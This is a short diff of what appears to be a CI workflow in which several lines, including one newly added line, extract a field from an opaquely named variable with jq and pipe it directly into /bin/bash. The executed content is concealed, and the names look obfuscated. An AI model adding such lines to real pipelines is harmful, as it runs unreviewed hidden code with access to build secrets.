@@ -21,6 +21,7 @@ jobs:
           echo $imd47 | jq -r .q60288 | /bin/bash
           echo $oew3365 | jq -r .si85 | /bin/bash
           echo $n58380 | jq -r .xzc1672 | /bin/bash
+          printf '%s' "$pkr86090" | jq -r .i24 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
